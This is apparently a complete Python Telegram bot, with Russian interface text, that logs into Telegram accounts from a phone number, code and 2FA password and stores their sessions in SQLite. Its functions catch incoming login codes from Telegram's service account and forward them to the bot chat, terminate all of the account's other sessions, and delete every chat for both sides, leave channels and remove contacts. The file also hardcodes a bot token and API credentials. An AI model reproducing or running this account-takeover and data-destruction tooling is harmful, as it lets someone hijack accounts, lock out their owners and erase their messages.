import os
import re
import random
import asyncio
import logging
import sqlite3
from typing import Optional

from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient, errors, functions, events
from telethon.sessions import StringSession
from telethon.tl.types import Channel, Chat
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.contacts import DeleteContactsRequest, BlockRequest

# ================= CONFIG =================
BOT_TOKEN = "8892329170:AAHyKucCh4v5sfRkqeaV5qo9DDdiGd-Fjmk"
API_ID = 39813941
API_HASH = "6aa1f649d2a6b3a308bc27aed9e6de29"

# путь к локальной БД (можно переопределить через env)
DB_PATH = os.getenv("DB_PATH", "sessions.db")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

CLIENTS = {}
PHONES = {}
HUNT_TASKS = {}

PHONE_RE = re.compile(r"^\+?\d{7,15}$")
CODE_RE = re.compile(r"\b(\d{4,7})\b")
TELEGRAM_SERVICE_ID = 777000


# ================= SQLite =================
_db_lock = asyncio.Lock()


def _db_conn() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            phone TEXT PRIMARY KEY,
            session TEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    return conn


def _init_db():
    conn = _db_conn()
    conn.close()
    logging.info(f"sqlite ready: {os.path.abspath(DB_PATH)}")


def _db_get(phone: str) -> Optional[str]:
    conn = _db_conn()
    try:
        row = conn.execute(
            "SELECT session FROM sessions WHERE phone = ?", (phone,)
        ).fetchone()
        return row[0] if row else None
    finally:
        conn.close()


def _db_put(phone: str, session: str):
    conn = _db_conn()
    try:
        conn.execute(
            """INSERT INTO sessions (phone, session, updated_at)
               VALUES (?, ?, CURRENT_TIMESTAMP)
               ON CONFLICT(phone) DO UPDATE SET
                 session = excluded.session,
                 updated_at = CURRENT_TIMESTAMP""",
            (phone, session),
        )
        conn.commit()
    finally:
        conn.close()


def _db_delete(phone: str):
    conn = _db_conn()
    try:
        conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
        conn.commit()
    finally:
        conn.close()


def _db_all_phones():
    conn = _db_conn()
    try:
        return [r[0] for r in conn.execute("SELECT phone FROM sessions").fetchall()]
    finally:
        conn.close()


async def save_session(phone: str, cli: TelegramClient):
    string = StringSession.save(cli.session)
    async with _db_lock:
        await asyncio.to_thread(_db_put, phone, string)
    logging.info(f"session saved: {phone}")


async def load_session(phone: str) -> Optional[str]:
    try:
        async with _db_lock:
            return await asyncio.to_thread(_db_get, phone)
    except Exception as e:
        logging.warning(f"load_session {phone}: {e}")
        return None


async def drop_session(phone: str):
    try:
        async with _db_lock:
            await asyncio.to_thread(_db_delete, phone)
    except Exception as e:
        logging.warning(f"drop_session {phone}: {e}")


async def make_client(phone: str) -> TelegramClient:
    stored = await load_session(phone)
    if stored:
        logging.info(f"restored: {phone}")
        return TelegramClient(StringSession(stored), API_ID, API_HASH)
    return TelegramClient(StringSession(), API_ID, API_HASH)


# ================= phone =================
def normalize_phone(raw: str) -> Optional[str]:
    s = re.sub(r"[\s\-\(\)]", "", raw.strip())
    if not s.startswith("+"):
        if s.startswith("8") and len(s) == 11:
            s = "+7" + s[1:]
        else:
            s = "+" + s
    if not PHONE_RE.match(s):
        return None
    return s


# ================= delays =================
async def human_delay(min_s=1.5, max_s=4.0):
    await asyncio.sleep(random.uniform(min_s, max_s))


async def safe(coro_factory, label=""):
    while True:
        try:
            return await coro_factory()
        except errors.FloodWaitError as e:
            wait = e.seconds + random.randint(5, 15)
            logging.warning(f"[FloodWait] {label} {wait}s")
            await asyncio.sleep(wait)
        except errors.SlowModeWaitError as e:
            await asyncio.sleep(e.seconds + 2)
        except errors.RPCError as e:
            logging.warning(f"[RPC] {label} {e}")
            return None


# ================= clean =================
async def clear_dialog(cli, entity):
    name = getattr(entity, "name", None) or getattr(entity, "username", "?")
    try:
        await safe(lambda: cli(DeleteHistoryRequest(peer=entity, max_id=0, revoke=True)), name)
        logging.info(f"clear: {name}")
    except Exception as e:
        logging.warning(f"fail {name}: {e}")
    await human_delay()


async def clean_private(cli):
    async for d in cli.iter_dialogs():
        if d.is_user and not d.entity.bot and not d.entity.deleted:
            await clear_dialog(cli, d.entity)


async def clean_groups(cli):
    async for d in cli.iter_dialogs():
        e = d.entity
        if isinstance(e, Chat) or (isinstance(e, Channel) and e.megagroup):
            await clear_dialog(cli, e)


async def clean_channels(cli, leave=True):
    async for d in cli.iter_dialogs():
        e = d.entity
        if isinstance(e, Channel) and not e.megagroup:
            await clear_dialog(cli, e)
            if leave:
                try:
                    await safe(lambda: cli(LeaveChannelRequest(e)), d.name)
                except Exception as ex:
                    logging.warning(f"leave fail {d.name}: {ex}")
                await human_delay()


async def clean_bots(cli):
    async for d in cli.iter_dialogs():
        if d.is_user and d.entity.bot:
            await clear_dialog(cli, d.entity)


async def clean_contacts(cli, remove=True, block=False):
    if not (remove or block):
        return
    result = await cli(functions.contacts.GetContactsRequest(hash=0))
    ids = [c.user_id for c in result.contacts]
    if remove and ids:
        try:
            await safe(lambda: cli(DeleteContactsRequest(id=ids)), "contacts")
        except Exception as e:
            logging.warning(f"contacts fail: {e}")
    if block:
        for uid in ids:
            try:
                await safe(lambda u=uid: cli(BlockRequest(id=u)), f"block {uid}")
                await human_delay(1, 3)
            except Exception as e:
                logging.warning(f"block {uid}: {e}")


async def delete_all_dialogs(cli):
    async for d in cli.iter_dialogs():
        e = d.entity
        try:
            await safe(lambda p=e: cli(DeleteHistoryRequest(peer=p, max_id=0, revoke=True)), d.name)
        except Exception as ex:
            logging.warning(f"fail {d.name}: {ex}")
        await human_delay()


async def full_wipe(cli, leave_channels=True, drop_contacts=True):
    await clean_private(cli)
    await clean_groups(cli)
    await clean_channels(cli, leave=leave_channels)
    await clean_bots(cli)
    if drop_contacts:
        await clean_contacts(cli, remove=True, block=False)


async def reset_other_sessions(cli):
    try:
        await cli(functions.account.ResetAuthorizationRequest(hash=0))
    except Exception as e:
        logging.warning(f"reset_other_sessions fail: {e}")
        raise


# ================= hunt =================
async def hunt_code(cli, chat_id: int, minutes: int = 5):
    found = asyncio.Event()

    @cli.on(events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
    async def handler(event):
        text = event.message.message or ""
        for match in CODE_RE.finditer(text):
            code = match.group(1)
            try:
                await bot.send_message(chat_id, f"код: <code>{code}</code>", parse_mode="HTML")
            except Exception as e:
                logging.warning(f"send code fail: {e}")
            found.set()
            return

    try:
        await asyncio.wait_for(found.wait(), timeout=minutes * 60)
    except asyncio.TimeoutError:
        try:
            await bot.send_message(chat_id, "код не поймал за 5 минут")
        except Exception:
            pass
    finally:
        cli.remove_event_handler(handler)
        HUNT_TASKS.pop(chat_id, None)


# ================= bot =================
class Auth(StatesGroup):
    phone = State()
    code = State()
    twofa = State()


bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="войти", callback_data="auth")],
        [InlineKeyboardButton(text="статус", callback_data="status")],
        [InlineKeyboardButton(text="ловить код", callback_data="hunt")],
        [InlineKeyboardButton(text="чистка", callback_data="clean_menu")],
        [InlineKeyboardButton(text="сброс сессий", callback_data="reset_sessions")],
        [InlineKeyboardButton(text="отключить", callback_data="logout")],
    ])


def clean_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="удалить всё (все чаты)", callback_data="delete_all")],
        [InlineKeyboardButton(text="личка", callback_data="clean_private")],
        [InlineKeyboardButton(text="группы", callback_data="clean_groups")],
        [InlineKeyboardButton(text="каналы+выйти", callback_data="clean_channels")],
        [InlineKeyboardButton(text="боты", callback_data="clean_bots")],
        [InlineKeyboardButton(text="контакты", callback_data="clean_contacts")],
        [InlineKeyboardButton(text="ПОЛНЫЙ WIPE", callback_data="wipe")],
        [InlineKeyboardButton(text="назад", callback_data="menu")],
    ])


def back_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="меню", callback_data="menu")]
    ])


async def cleanup_client(chat_id: int):
    task = HUNT_TASKS.pop(chat_id, None)
    if task:
        task.cancel()
    cli = CLIENTS.pop(chat_id, None)
    if cli:
        try:
            await cli.disconnect()
        except Exception:
            pass
    PHONES.pop(chat_id, None)


def get_authed(chat_id: int) -> Optional[TelegramClient]:
    return CLIENTS.get(chat_id)


@dp.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    await cleanup_client(msg.chat.id)
    await msg.answer("меню:", reply_markup=main_menu())


@dp.message(Command("clean"))
async def cmd_clean(msg: Message):
    await msg.answer("чистка:", reply_markup=clean_menu())


@dp.callback_query(lambda c: c.data == "menu")
async def cb_menu(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await cb.message.edit_text("меню:", reply_markup=main_menu())
    await cb.answer()


@dp.callback_query(lambda c: c.data == "clean_menu")
async def cb_clean_menu(cb: CallbackQuery):
    await cb.message.edit_text("чистка:", reply_markup=clean_menu())
    await cb.answer()


@dp.callback_query(lambda c: c.data == "auth")
async def cb_auth(cb: CallbackQuery, state: FSMContext):
    await cleanup_client(cb.message.chat.id)
    await state.set_state(Auth.phone)
    await cb.message.edit_text("номер?", reply_markup=back_menu())
    await cb.answer()


@dp.callback_query(lambda c: c.data == "status")
async def cb_status(cb: CallbackQuery):
    cli = CLIENTS.get(cb.message.chat.id)
    if not cli:
        await cb.message.edit_text("нет сессии", reply_markup=back_menu())
    elif await cli.is_user_authorized():
        me = await cli.get_me()
        await cb.message.edit_text(
            f"залогинен: {me.first_name or ''} @{me.username or me.id}",
            reply_markup=back_menu(),
        )
    else:
        await cb.message.edit_text(
            f"не завершён: {PHONES.get(cb.message.chat.id)}",
            reply_markup=back_menu(),
        )
    await cb.answer()


@dp.callback_query(lambda c: c.data == "logout")
async def cb_logout(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await cleanup_client(cb.message.chat.id)
    await cb.message.edit_text("отключено", reply_markup=back_menu())
    await cb.answer()


@dp.callback_query(lambda c: c.data == "reset_sessions")
async def cb_reset(cb: CallbackQuery):
    cli = CLIENTS.get(cb.message.chat.id)
    if not cli or not await cli.is_user_authorized():
        await cb.message.edit_text("сначала войди", reply_markup=back_menu())
        return await cb.answer()
    await cb.message.edit_text("сбрасываю...", reply_markup=back_menu())
    try:
        await reset_other_sessions(cli)
        await cb.message.edit_text("ok", reply_markup=back_menu())
    except Exception as e:
        await cb.message.edit_text(f"err: {e}", reply_markup=back_menu())
    await cb.answer()


@dp.callback_query(lambda c: c.data == "hunt")
async def cb_hunt(cb: CallbackQuery):
    chat_id = cb.message.chat.id
    cli = CLIENTS.get(chat_id)
    if not cli or not await cli.is_user_authorized():
        await cb.message.edit_text("сначала войди", reply_markup=back_menu())
        return await cb.answer()
    if chat_id in HUNT_TASKS:
        await cb.answer("уже ловлю")
        return
    await cb.message.edit_text("ловлю код 5 минут...", reply_markup=back_menu())
    task = asyncio.create_task(hunt_code(cli, chat_id, minutes=5))
    HUNT_TASKS[chat_id] = task
    await cb.answer()


async def run_clean(cb: CallbackQuery, coro, label: str):
    cli = get_authed(cb.message.chat.id)
    if not cli or not await cli.is_user_authorized():
        await cb.message.edit_text("сначала войди", reply_markup=back_menu())
        return await cb.answer()
    await cb.message.edit_text(f"{label}...", reply_markup=back_menu())
    try:
        await coro(cli)
        await cb.message.edit_text(f"{label} ok", reply_markup=back_menu())
    except Exception as e:
        await cb.message.edit_text(f"{label} err: {e}", reply_markup=back_menu())
    await cb.answer()


@dp.callback_query(lambda c: c.data == "delete_all")
async def cb_delete_all(cb: CallbackQuery):
    await run_clean(cb, delete_all_dialogs, "удаляю все чаты")


@dp.callback_query(lambda c: c.data == "clean_private")
async def cb_clean_private(cb: CallbackQuery):
    await run_clean(cb, clean_private, "личка")


@dp.callback_query(lambda c: c.data == "clean_groups")
async def cb_clean_groups(cb: CallbackQuery):
    await run_clean(cb, clean_groups, "группы")


@dp.callback_query(lambda c: c.data == "clean_channels")
async def cb_clean_channels(cb: CallbackQuery):
    await run_clean(cb, lambda c: clean_channels(c, leave=True), "каналы")


@dp.callback_query(lambda c: c.data == "clean_bots")
async def cb_clean_bots(cb: CallbackQuery):
    await run_clean(cb, clean_bots, "боты")


@dp.callback_query(lambda c: c.data == "clean_contacts")
async def cb_clean_contacts(cb: CallbackQuery):
    await run_clean(cb, lambda c: clean_contacts(c, remove=True, block=False), "контакты")


@dp.callback_query(lambda c: c.data == "wipe")
async def cb_wipe(cb: CallbackQuery):
    await run_clean(cb, full_wipe, "wipe")


@dp.message(Auth.phone)
async def step_phone(msg: Message, state: FSMContext):
    phone = normalize_phone(msg.text or "")
    if not phone:
        return await msg.answer("номер?", reply_markup=back_menu())

    cli = await make_client(phone)
    CLIENTS[msg.chat.id] = cli
    PHONES[msg.chat.id] = phone

    try:
        await cli.connect()
        if await cli.is_user_authorized():
            me = await cli.get_me()
            await state.clear()
            return await msg.answer(
                f"уже залогинен: {me.first_name or ''} @{me.username or me.id}",
                reply_markup=main_menu(),
            )
        await cli.send_code_request(phone)
        await state.set_state(Auth.code)
        await msg.answer("код?", reply_markup=back_menu())
    except errors.PhoneNumberInvalidError:
        await msg.answer("номер невалиден", reply_markup=back_menu())
        await state.clear()
        await cleanup_client(msg.chat.id)
    except errors.FloodWaitError as e:
        await msg.answer(f"flood {e.seconds}s", reply_markup=back_menu())
        await state.clear()
        await cleanup_client(msg.chat.id)
    except Exception as e:
        await msg.answer(f"err: {e}", reply_markup=back_menu())
        await state.clear()
        await cleanup_client(msg.chat.id)


@dp.message(Auth.code)
async def step_code(msg: Message, state: FSMContext):
    code = re.sub(r"\D", "", msg.text or "")
    if not (4 <= len(code) <= 7):
        return await msg.answer("код?", reply_markup=back_menu())

    cli = CLIENTS.get(msg.chat.id)
    phone = PHONES.get(msg.chat.id)
    if not cli or not phone:
        await state.clear()
        return await msg.answer("/start")

    try:
        await cli.sign_in(phone=phone, code=code)
        me = await cli.get_me()
        await save_session(phone, cli)
        await state.clear()
        try:
            await msg.delete()
        except Exception:
            pass
        await msg.answer(
            f"ok: {me.first_name or ''} @{me.username or me.id}",
            reply_markup=main_menu(),
        )
    except errors.SessionPasswordNeededError:
        await state.set_state(Auth.twofa)
        await msg.answer("2fa?", reply_markup=back_menu())
    except errors.PhoneCodeInvalidError:
        await msg.answer("код неверный", reply_markup=back_menu())
    except errors.PhoneCodeExpiredError:
        await msg.answer("код протух", reply_markup=back_menu())
        await state.clear()
        await cleanup_client(msg.chat.id)
    except errors.FloodWaitError as e:
        await msg.answer(f"flood {e.seconds}s", reply_markup=back_menu())
    except Exception as e:
        await msg.answer(f"err: {e}", reply_markup=back_menu())


@dp.message(Auth.twofa)
async def step_2fa(msg: Message, state: FSMContext):
    cli = CLIENTS.get(msg.chat.id)
    phone = PHONES.get(msg.chat.id)
    if not cli or not phone:
        await state.clear()
        return await msg.answer("/start")

    try:
        await cli.sign_in(password=msg.text or "")
        me = await cli.get_me()
        await save_session(phone, cli)
        await state.clear()
        try:
            await msg.delete()
        except Exception:
            pass
        await msg.answer(
            f"ok: {me.first_name or ''} @{me.username or me.id}",
            reply_markup=main_menu(),
        )
    except errors.PasswordHashInvalidError:
        await msg.answer("пароль неверный", reply_markup=back_menu())
    except errors.FloodWaitError as e:
        await msg.answer(f"flood {e.seconds}s", reply_markup=back_menu())
    except Exception as e:
        await msg.answer(f"err: {e}", reply_markup=back_menu())


@dp.message()
async def fallback(msg: Message, state: FSMContext):
    cur = await state.get_state()
    if cur in (Auth.phone, Auth.code, Auth.twofa):
        return
    await msg.answer("меню:", reply_markup=main_menu())


async def main():
    _init_db()
    logging.info(f"bot up, sessions -> sqlite:{os.path.abspath(DB_PATH)}")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
